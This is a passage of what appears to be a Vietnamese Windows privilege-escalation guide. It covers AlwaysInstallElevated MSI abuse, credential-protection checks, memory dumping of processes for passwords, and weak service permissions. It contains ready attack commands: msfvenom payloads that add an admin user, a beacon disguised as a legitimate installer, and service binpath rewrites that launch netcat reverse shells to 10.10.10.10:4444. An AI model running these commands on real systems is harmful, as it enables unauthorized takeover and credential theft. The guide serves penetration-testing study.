**Nếu** 2 khóa registry này được **bật** (giá trị là **0x1**), thì người dùng ở bất kỳ cấp đặc quyền nào cũng có thể **cài đặt** (thực thi) các tệp `*.msi` với quyền NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Nếu bạn có một phiên meterpreter, bạn có thể tự động hóa kỹ thuật này bằng module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Dùng lệnh `Write-UserAddMSI` từ power-up để tạo một tệp nhị phân Windows MSI trong thư mục hiện tại nhằm leo thang đặc quyền. Script này ghi ra một trình cài đặt MSI đã biên dịch sẵn, trình cài đặt sẽ yêu cầu thêm người dùng/nhóm (vì vậy bạn cần quyền truy cập GUI):

```
Write-UserAddMSI
```

Chỉ cần chạy binary vừa tạo để leo thang đặc quyền.

### MSI Wrapper

Đọc tutorial này để tìm hiểu cách tạo MSI wrapper bằng công cụ này. Lưu ý rằng bạn có thể bọc một tệp "**.bat**" nếu bạn **chỉ** muốn **thực thi** **các dòng lệnh**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Tạo** bằng Cobalt Strike hoặc Metasploit một **payload Windows EXE TCP mới** tại `C:\privesc\beacon.exe`
- Mở **Visual Studio**, chọn **Create a new project** và nhập "installer" vào hộp tìm kiếm. Chọn dự án **Setup Wizard** rồi nhấp **Next**.
- Đặt tên cho dự án, chẳng hạn **AlwaysPrivesc**, dùng `C:\privesc` làm vị trí, chọn **place solution and project in the same directory**, rồi nhấp **Create**.
- Tiếp tục nhấp **Next** cho đến bước 3/4 (chọn các tệp cần đưa vào). Nhấp **Add** và chọn payload Beacon vừa tạo. Sau đó nhấp **Finish**.
- Chọn dự án **AlwaysPrivesc** trong **Solution Explorer**, rồi trong **Properties**, đổi **TargetPlatform** từ **x86** sang **x64**.
  - Bạn có thể thay đổi các thuộc tính khác, chẳng hạn **Author** và **Manufacturer**, để ứng dụng sau khi cài đặt trông hợp pháp hơn.
- Nhấp chuột phải vào dự án và chọn **View > Custom Actions**.
- Nhấp chuột phải vào **Install** và chọn **Add Custom Action**.
- Nhấp đúp vào **Application Folder**, chọn tệp **beacon.exe** rồi nhấp **OK**. Việc này đảm bảo payload Beacon được thực thi ngay khi trình cài đặt chạy.
- Trong **Custom Action Properties**, đổi **Run64Bit** thành **True**.
- Cuối cùng, **build dự án**.
  - Nếu xuất hiện cảnh báo `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, hãy đảm bảo bạn đã đặt platform thành x64.

### MSI Installation

Để thực thi quá trình **cài đặt** tệp `.msi` độc hại trong **nền:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Để khai thác lỗ hổng này, bạn có thể dùng: _exploit/windows/local/always_install_elevated_

## Antivirus và công cụ phát hiện

### Cài đặt kiểm tra

Các cài đặt này quyết định những gì được **ghi nhật ký**, vì vậy bạn nên chú ý.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding, sẽ rất hữu ích nếu biết nhật ký được gửi đến đâu.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** được thiết kế để **quản lý mật khẩu Administrator cục bộ**, đảm bảo mỗi mật khẩu **duy nhất, được tạo ngẫu nhiên và cập nhật thường xuyên** trên các máy tính đã tham gia domain. Những mật khẩu này được lưu trữ an toàn trong Active Directory và chỉ người dùng được cấp đủ quyền thông qua ACL mới có thể truy cập, cho phép họ xem mật khẩu admin cục bộ nếu được ủy quyền.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Nếu được kích hoạt, **mật khẩu dạng plain-text sẽ được lưu trong LSASS** (Local Security Authority Subsystem Service).\
[**Tìm hiểu thêm về WDigest tại đây**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### Bảo vệ LSA

Bắt đầu từ **Windows 8.1**, Microsoft đã tăng cường bảo vệ Local Security Authority (LSA) để **chặn** các tiến trình không đáng tin cậy cố **đọc bộ nhớ** của LSA hoặc tiêm mã, qua đó tăng cường bảo mật hệ thống.\
[**Tìm hiểu thêm về LSA Protection tại đây**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** được giới thiệu trong **Windows 10**. Mục đích của tính năng này là bảo vệ thông tin xác thực được lưu trữ trên thiết bị khỏi các mối đe dọa như các cuộc tấn công pass-the-hash. [**Tìm hiểu thêm về Credential Guard tại đây.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Thông tin xác thực được lưu trong bộ nhớ đệm

**Thông tin xác thực miền** được xác thực bởi **Local Security Authority** (LSA) và được các thành phần của hệ điều hành sử dụng. Thông tin xác thực miền của người dùng thường được thiết lập khi dữ liệu đăng nhập của họ được một gói bảo mật đã đăng ký xác thực.\
[**Tìm hiểu thêm về thông tin xác thực được lưu trong bộ nhớ đệm tại đây**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Người dùng & Nhóm

### Liệt kê Người dùng & Nhóm

Bạn nên kiểm tra xem nhóm nào bạn thuộc về có quyền đáng chú ý hay không.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Nhóm đặc quyền

Nếu bạn **thuộc một nhóm đặc quyền, bạn có thể leo thang đặc quyền**. Tìm hiểu về các nhóm đặc quyền và cách lạm dụng chúng để leo thang đặc quyền tại đây:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Thao tác token

**Tìm hiểu thêm** về **token** là gì trên trang này: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Xem trang sau để **tìm hiểu về các token đáng chú ý** và cách lạm dụng chúng:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Người dùng đã đăng nhập / Phiên

```bash
qwinsta
klist sessions
```

### Thư mục người dùng

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Chính sách mật khẩu

```bash
net accounts
```

### Lấy nội dung từ clipboard

```bash
powershell -command "Get-Clipboard"
```

## Tiến trình đang chạy

### Quyền đối với tệp và thư mục

Trước tiên, khi liệt kê các tiến trình, **hãy kiểm tra mật khẩu trong dòng lệnh của tiến trình**.\
Kiểm tra xem bạn có thể **ghi đè một binary đang chạy** hay có quyền ghi vào thư mục chứa binary để khai thác các [**tấn công DLL Hijacking**](dll-hijacking/index.html) tiềm ẩn hay không:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Luôn kiểm tra xem có [**electron/cef/chromium debuggers** đang chạy hay không; bạn có thể lợi dụng chúng để leo thang đặc quyền](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

Debugger listener có thể chỉ tồn tại trong thời gian ngắn, vì vậy việc không thấy nó trong một lần chụp nhanh các cổng thụ động không chứng minh rằng nó chưa từng được mở. Đối chiếu mọi listener quan sát được với PID, chủ sở hữu tiến trình và khả năng truy cập của người dùng có đặc quyền thấp hơn; chỉ tên ứng dụng hoặc cờ debug thì chưa đủ để xác định khả năng thực thi mã giữa các người dùng. Hãy chỉ thực hiện enumeration thụ động thường lệ, không gửi lệnh debugger.

**Kiểm tra quyền của các binary tiến trình**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Kiểm tra quyền của các thư mục chứa tệp nhị phân của tiến trình (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Thư mục dynamic preprocessor của Snort

Snort 2 có thể tải shared library từ `dynamicpreprocessor directory` được khai báo trong cấu hình chọn bằng `snort.exe -c <config>`. Với scheduled task hoặc service chạy Snort dưới một tài khoản khác, hãy kiểm tra chính xác cấu hình đó và ACL của thư mục module được khai báo. Nếu token của bạn có thể tạo file tại đó, đây là đường dẫn cần xem xét về khả năng thực thi code khi task hoặc service đó tải module ở lần tiếp theo. Hãy xác minh các quyền hiệu lực của tài khoản chạy dịch vụ, cấu hình đang hoạt động, khả năng tương thích của module và mọi hạn chế về deny hoặc share; chỉ riêng việc thư mục có quyền ghi không chứng minh được khả năng leo thang đặc quyền. [Tài liệu về dynamic preprocessor của Snort](https://www.snort.org/documents/dpx-readme) mô tả việc tải module trong lúc chạy.

### Web service có đặc quyền với document root có quyền ghi

Trên bản cài Apache Windows, hãy đối chiếu đường dẫn executable của service và tài khoản chạy service với `DocumentRoot` trong `httpd.conf` đang hoạt động. Với bố cục XAMPP thông thường, hãy kiểm tra `C:\xampp\apache\conf\httpd.conf` và ACL của document root được cấu hình, thường là `C:\xampp\htdocs`. Nếu người dùng có đặc quyền thấp hơn có thể tạo file trong thư mục đó trong khi Apache chạy dưới quyền `LocalSystem`, việc thực thi code phía máy chủ có thể vượt qua ranh giới đặc quyền của host. Hãy xác nhận service đang chạy, đường dẫn chính xác được phục vụ và handler phía máy chủ xử lý loại file đó; chỉ riêng việc document root có quyền ghi chỉ chứng minh khả năng tạo file. Kiểm tra ACL mà không ghi file thử:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Với một cài đặt WAMP thông thường, service có thể trỏ đến `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (hoặc `C:\wamp\...` nếu dùng cấu trúc 32-bit), với cấu hình nằm cạnh đó tại `conf\httpd.conf` và thư mục gốc mặc định là `C:\wamp64\www` hoặc `C:\wamp\www`. Hãy kiểm tra đồng thời image chính xác của service, tài khoản chạy service, `DocumentRoot` thực tế (bao gồm việc khai triển `${INSTALL_DIR}` và các ghi đè virtual host) cùng ACL của thư mục gốc. Thư mục WAMP có quyền ghi không chứng minh rằng Apache chạy dưới quyền `SYSTEM` hoặc thực thi tệp được gửi lên. [Apache hướng dẫn cách service trên Windows chọn cấu hình](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Thư mục gốc IIS có quyền ghi và network identity của application pool

Với IIS, hãy ánh xạ một thư mục vật lý có quyền ghi tới một **site/application đang hoạt động** trong `applicationHost.config`, sau đó xác định pool được cấu hình và handler phía server. Mã đặt trong thư mục được phục vụ chỉ chạy dưới danh tính của pool nếu IIS xử lý loại tệp đó và route có thể truy cập được. Trước khi xem thư mục có quyền ghi là nơi thực thi mã, hãy kiểm tra quyền tạo tệp hiệu lực của user hiện tại, trạng thái hoạt động của site, handler và các ghi đè theo từng đường dẫn.

Dynamic compilation của ASP.NET tạo ra một đường dẫn riêng cần xem xét: các tệp được tạo trong thư mục biên dịch của ứng dụng. Mặc định, thư mục `Temporary ASP.NET Files` nằm bên dưới bản cài đặt .NET Framework tương ứng, nhưng `<compilation tempDirectory>` của ứng dụng có thể thay đổi vị trí này. [Microsoft mô tả vị trí và các thư mục con theo từng ứng dụng](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) và [khuyến nghị cách ly các thư mục biên dịch khi các application pool không tin cậy lẫn nhau](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Nếu token có đặc quyền thấp hơn có thể chỉnh sửa source được tạo trong cache của **ứng dụng cụ thể**, hãy xác định liệu ứng dụng đó có biên dịch lại source dưới [danh tính worker-process](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) có đặc quyền cao hơn hay không. Chỉ riêng ACL của tệp hoặc thư mục không chứng minh được khả năng thực thi mã: hãy đối chiếu cache với ứng dụng đang hoạt động, token và ACL hiệu lực, thiết lập biên dịch, danh tính process và thời điểm biên dịch lại. Chỉ xem xét metadata ở chế độ chỉ đọc; không kích hoạt biên dịch hoặc chỉnh sửa tệp cache trong quá trình liệt kê.

Một pool IIS được cấu hình là `ApplicationPoolIdentity` hoặc `NetworkService` thường xác thực với tài nguyên domain bằng **tài khoản máy chủ**, dù token cục bộ của nó có thể có đặc quyền thấp. `LocalSystem` vốn đã có đặc quyền cao trên máy cục bộ và cũng dùng tài khoản máy tính trên mạng; `LocalService` thường sử dụng thông tin xác thực mạng ẩn danh. Pool `SpecificUser` sử dụng tài khoản được cấu hình cho nó. [Microsoft mô tả các loại danh tính này](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) và [network identity của application pool](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Thiết lập danh tính bị lược bỏ có thể kế thừa mặc định của pool; các giá trị này khác nhau giữa các thế hệ IIS, vì vậy hãy xác định cấu hình hiệu lực thay vì suy đoán từ tên pool. Nếu thực thi mã đạt đến pool có network identity là tài khoản máy tính, hãy đánh giá quyền thư mục của **chính máy tính đó**. [DCSync](../active-directory-methodology/dcsync.md) yêu cầu quyền replication trên domain naming context; ticket của machine account hoặc vai trò của máy chủ không tự chứng minh rằng máy có các quyền đó. Việc liệt kê thụ động nên kiểm tra cấu hình và ACL mà không tải tệp lên, thực hiện xác thực mạng hoặc yêu cầu ticket.

Với một ASP.NET handler có thể đọc được và khởi chạy process phụ, hãy theo dõi mọi giá trị bắt nguồn từ request qua các bước xác thực, giải mã, kiểm tra hợp lệ và tạo lệnh. Handler nối token đã giải mã vào `ProcessStartInfo("cmd", "/c ...")` có thể cho phép các ký tự đặc biệt của shell thay đổi lệnh; [Microsoft mô tả các ký tự đặc biệt của `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Hãy xác minh rằng caller không đáng tin cậy thực sự có thể tác động đến giá trị đã giải mã và truy cập handler, sau đó xác định danh tính application pool hiệu lực hoặc danh tính được impersonate cùng danh tính của child process. Chỉ riêng một dòng source có thể đọc được, một listener localhost hoặc điểm yếu trong định dạng token không chứng minh được khả năng thực thi lệnh với đặc quyền cao. Hãy xem xét source và cấu hình pool mà không gửi request giả mạo hoặc chạy helper trong quá trình liệt kê thụ động.

Với service PHP trên Windows, một đường dẫn do request kiểm soát được truyền vào [`include` hoặc `require`](https://www.php.net/manual/en/function.include.php) có thể thực thi tệp PHP mà user cấp thấp hơn có thể ghi, dưới danh tính của worker. Hãy xác nhận rằng request có thể đi đến câu lệnh đó, đường dẫn đã phân giải trỏ đến tệp mà user cấp thấp hơn có thể sửa và worker có thể đọc, các giới hạn đường dẫn PHP áp dụng cho phép include, và worker thực sự chạy với đặc quyền cao hơn. Listener loopback hoặc tệp có quyền ghi không đủ để chứng minh chuỗi tấn công này; hãy kiểm tra source, danh tính service và ACL của tệp mà không gọi endpoint trong quá trình liệt kê thụ động.

### Khai thác mật khẩu trong bộ nhớ

Bạn có thể tạo memory dump của một process đang chạy bằng **procdump** từ sysinternals. Các service như FTP có **thông tin xác thực ở dạng clear text trong bộ nhớ**; hãy thử dump bộ nhớ và đọc thông tin xác thực.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Ứng dụng GUI không an toàn

**Ứng dụng chạy dưới quyền SYSTEM có thể cho phép người dùng mở CMD hoặc duyệt thư mục.**

Ví dụ: "Windows Help and Support" (Windows + F1), tìm "command prompt", nhấp vào "Click to open Command Prompt"

### Nhập project-file với quyền cao

Ứng dụng tự động mở các project từ thư mục thả mà người dùng cấp thấp có quyền ghi sẽ vượt qua ranh giới tin cậy đầu vào dưới tài khoản của ứng dụng nhập. Kiểm tra **đường dẫn chính xác có quyền ghi**, tiến trình hoặc tác vụ mở đường dẫn đó, danh tính hiệu lực và phiên bản parser. Một [lỗi lịch sử khi mở/khôi phục project Ghidra](https://github.com/NationalSecurityAgency/ghidra/issues/71) cho phép dùng external entity XML trong metadata của project; trên Windows, một network entity có thể khiến tài khoản nhập xác thực nếu [chính sách outbound SMB và NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) cho phép. Đây là manh mối về lộ thông tin xác thực, không phải quyền truy cập administrator tức thời: phản hồi phải sử dụng được qua một đường dẫn riêng được cho phép hoặc dễ bị tổn thương, và cần đánh giá các bản build hiện tại dựa trên trạng thái vá thực tế. Không mở project được tạo đặc biệt trong quá trình liệt kê thụ động; hãy kiểm tra quy trình nhập và ACL.

## Services

Quyền [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) trên đối tượng Service Control Manager (SCM) tách biệt với các quyền trên một service hiện có. Yêu cầu quyền [`OpenSCManager` chỉ đọc](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) thành công đối với quyền đó là manh mối cần xem xét, không phải bằng chứng rằng service mới có thể chạy. [`CreateService` trả về một handle](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) có các quyền service được yêu cầu khi tạo; lần mở lại service sau đó sẽ thực hiện một kiểm tra quyền riêng và có thể thất bại ngay cả khi handle ban đầu có thể được sử dụng. Hãy xác minh riêng token cục bộ hoặc từ xa có hiệu lực, quyền được cấp cho handle, tài khoản service, chính sách khởi động và đường dẫn executable. Không tạo hoặc khởi động service trong quá trình liệt kê thụ động.

Đối với đường dẫn cài đặt service từ xa, hãy đối chiếu các quyền SCM đó với một share trên máy đích mà **cùng một lần đăng nhập mạng** có thể ghi, ACL NTFS bên dưới của share và đường dẫn executable cục bộ mà tài khoản service có thể chạy. Tài khoản không phải admin có thể vượt qua ranh giới này nếu tồn tại đồng thời quyền SCM rộng bất thường và đường dẫn đặt file; administrative share không phải điều kiện tiên quyết vốn có. Chỉ có quyền ghi vào share hoặc manh mối về quyền tạo service trên SCM không chứng minh rằng service mới có thể khởi động dưới danh tính cao hơn.

Một service hiện có có thể gọi executable trợ giúp khi khởi động, tắt hoặc trong một sự kiện vòng đời khác, ngay cả khi executable đó không có trong `ImagePath`. Nếu tên executable trợ giúp được phân giải thành một thư mục mà người dùng cấp thấp có quyền ghi và service chạy dưới danh tính cao hơn, file trợ giúp bị thiếu có thể là ứng viên để thay thế trong một số điều kiện. Hãy xác nhận **mã service thực tế hoặc lời gọi executable trợ giúp được ghi nhận**, đường dẫn executable được phân giải và thứ tự tìm kiếm, quyền tạo thư mục, danh tính service và một trigger vòng đời khả dụng. Chỉ riêng thư mục service có quyền ghi hoặc file bị thiếu không chứng minh service sẽ tải file đó; khi rà soát thụ động, không khởi động hoặc dừng service.

Đối với service hiện có, [`SERVICE_START` cho phép cung cấp tham số cho `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); quyền này khác với [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Hãy xem mã hoặc giao diện được ghi nhận của service trước khi coi quyền khởi động là thứ gì hơn một quyền điều khiển. Nếu service dùng tham số do caller chọn làm đường dẫn log hoặc export, hãy xác minh danh tính service, luồng ghi chính xác từ tham số, các giới hạn đường dẫn và quyền trên **file được tạo**. Việc ghi vào thư mục được bảo vệ chỉ có thể dẫn đến leo thang quyền khi có một consumer hoặc loader có quyền cao riêng biệt chấp nhận file đó; chỉ có log được ghi hoặc quyền khởi động là chưa đủ. Khi kiểm kê thụ động, không khởi động service hoặc tạo file kiểm thử.

Đối với agent giám sát NSClient++, file `nsclient.ini` đọc được là **manh mối cần rà soát cấu hình**: file này có thể chứa thông tin đăng nhập web, còn `boot.ini` có thể chuyển hướng cấu hình sang vị trí khác. Kiểm tra tài khoản service thực tế, listener WEB và chính sách truy cập, cũng như liệu role đã xác thực có thể thay đổi cài đặt hoặc script hay không. Để thực thi với quyền cao, còn cần `CheckExternalScripts` (hoặc một đường dẫn thực thi khác đang bật), quyền thực tế để đăng ký hoặc sửa đổi command và trigger chạy command đó dưới danh tính service. Listener chỉ lắng nghe loopback vẫn có thể được người dùng cục bộ truy cập, nhưng riêng đường dẫn file, mật khẩu hoặc listener không chứng minh có các quyền đó. Rà soát metadata và quyền mà không hiển thị bí mật hoặc gọi web API trong quá trình liệt kê thụ động. Xem [bố cục file của NSClient++](https://nsclient.org/docs/concepts/file-layout/), [hướng dẫn bảo mật web và script](https://nsclient.org/docs/setup/securing/) và [cấu hình external-script](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Đối với service có `ImagePath` là `nssm.exe`, hãy kiểm tra tài khoản chạy thực tế của service và giá trị `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM lưu ứng dụng con tại đó](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), còn `AppDirectory` là thư mục làm việc được cấu hình. Kiểm tra executable con và ACL của các thư mục cha trước khi cho rằng quyền của wrapper đã bao quát toàn bộ ranh giới service. Endpoint WCF hoặc SOAP cục bộ do ứng dụng con đó cung cấp là một manh mối cần xem xét riêng: xác nhận người dùng có quyền thấp có thể truy cập listener, thao tác cụ thể có chấp nhận đầu vào của họ hay không và ứng dụng con của service có thực thi thao tác không an toàn dưới danh tính cao hơn hay không. Tài khoản service, URL endpoint hoặc đường dẫn có quyền ghi riêng lẻ không chứng minh được khả năng leo thang quyền; tránh gọi các thao tác của service trong quá trình liệt kê thụ động.

Đối với thao tác WCF tùy chỉnh, hãy lần theo một chuỗi do caller kiểm soát đến mọi PowerShell runspace. [`Pipeline.Commands.AddScript` thêm văn bản script](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), còn [`Pipeline.Invoke` chạy pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` với thông tin xác thực Windows transport](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) xác thực client, nhưng cần kiểm tra riêng quyền gọi **thao tác cụ thể đó** và danh tính hiệu lực của runspace. Đường đi từ đầu vào của caller có quyền thấp đến `AddScript` dưới danh tính service cao hơn là một ranh giới thực thi mã; chỉ có cổng đang lắng nghe, client đã xác thực hoặc một method không được dùng trong assembly không liên quan không phải bằng chứng. Rà soát tĩnh service đã triển khai, contract, quyền truy cập và cài đặt impersonation mà không gọi endpoint trong quá trình liệt kê.

Service Triggers cho phép Windows khởi động service khi một số điều kiện xảy ra (hoạt động trên named pipe/RPC endpoint, sự kiện ETW, IP khả dụng, thiết bị được kết nối, làm mới GPO, v.v.). Ngay cả khi không có quyền SERVICE_START, bạn thường vẫn có thể khởi động service có quyền cao bằng cách kích hoạt trigger của chúng. Xem các kỹ thuật liệt kê và kích hoạt tại đây:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Dịch vụ thu thập chẩn đoán Visual Studio

Các bản cài đặt Visual Studio có công cụ C/C++ có thể bao gồm `VSStandardCollectorService150`, một dịch vụ chẩn đoán được cấu hình chạy dưới quyền `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) đã dùng junction và race với object-manager-link để chuyển hướng việc đặt lại DACL của service. Việc leo thang được trình diễn cũng cần một đường dẫn sửa chữa MSI khả dụng của Visual Studio Setup WMI Provider và target `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Thành phần này đã được sửa vào tháng 1 năm 2024.

Khi phân loại thụ động, hãy kiểm tra tài khoản và đường dẫn binary của service đó, xác minh đường dẫn Setup WMI compiler có tồn tại hay không và kiểm tra trạng thái vá của thành phần đã cài đặt. Chỉ riêng mục service, phiên bản sản phẩm Visual Studio hoặc file compiler không chứng minh host dễ bị tấn công. Việc kiểm tra không cần khởi động service hoặc chạy thao tác sửa chữa.

Lấy danh sách service:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Quyền hạn

Bạn có thể dùng **sc** để lấy thông tin về một service

```bash
sc qc <service_name>
```

Bạn nên có binary **accesschk** từ _Sysinternals_ để kiểm tra mức đặc quyền cần thiết cho từng dịch vụ.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Bạn nên kiểm tra xem "Authenticated Users" có thể chỉnh sửa bất kỳ dịch vụ nào hay không:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Tải accesschk.exe cho XP tại đây](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Bật service

Nếu bạn gặp lỗi này (ví dụ với SSDPSRV):

_Lỗi hệ thống 1058 đã xảy ra._\
_Không thể khởi động service vì service đã bị tắt hoặc không có thiết bị nào được bật liên kết với service._

Bạn có thể bật service bằng cách dùng

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Lưu ý rằng dịch vụ upnphost phụ thuộc vào SSDPSRV để hoạt động (đối với XP SP1)**

**Một cách khắc phục khác** cho vấn đề này là chạy:

```
sc.exe config usosvc start= auto
```

### **Sửa đổi đường dẫn binary của service**

Trong trường hợp nhóm "Authenticated users" có quyền **SERVICE_ALL_ACCESS** trên một service, có thể sửa đổi binary thực thi của service. Để sửa đổi và thực thi **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Khởi động lại dịch vụ

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Có thể leo thang đặc quyền thông qua nhiều quyền khác nhau:

- **SERVICE_CHANGE_CONFIG**: Cho phép cấu hình lại binary của dịch vụ.
- **WRITE_DAC**: Cho phép cấu hình lại quyền, từ đó có thể thay đổi cấu hình dịch vụ.
- **WRITE_OWNER**: Cho phép chiếm quyền sở hữu và cấu hình lại quyền.
- **GENERIC_WRITE**: Kế thừa khả năng thay đổi cấu hình dịch vụ.
- **GENERIC_ALL**: Cũng kế thừa khả năng thay đổi cấu hình dịch vụ.

Có thể sử dụng _exploit/windows/local/service_permissions_ để phát hiện và khai thác lỗ hổng này.

### Quyền yếu trên binary dịch vụ

Nếu một dịch vụ chạy với quyền **`LocalSystem`**, **`LocalService`**, **`NetworkService`** hoặc một tài khoản domain có đặc quyền, nhưng **người dùng có đặc quyền thấp có thể sửa đổi EXE của dịch vụ hoặc thư mục cha của nó**, thì dịch vụ thường có thể bị chiếm quyền bằng cách **thay thế binary và khởi động lại dịch vụ**.

**Kiểm tra xem bạn có thể sửa đổi binary mà dịch vụ thực thi hay không**, hoặc bạn có **quyền ghi vào thư mục** chứa binary đó hay không ([**DLL Hijacking**](dll-hijacking/index.html)**.**\
Bạn có thể lấy danh sách mọi binary được dịch vụ thực thi bằng **wmic** (không nằm trong system32), rồi kiểm tra quyền của mình bằng **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Bạn cũng có thể sử dụng **sc** và **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
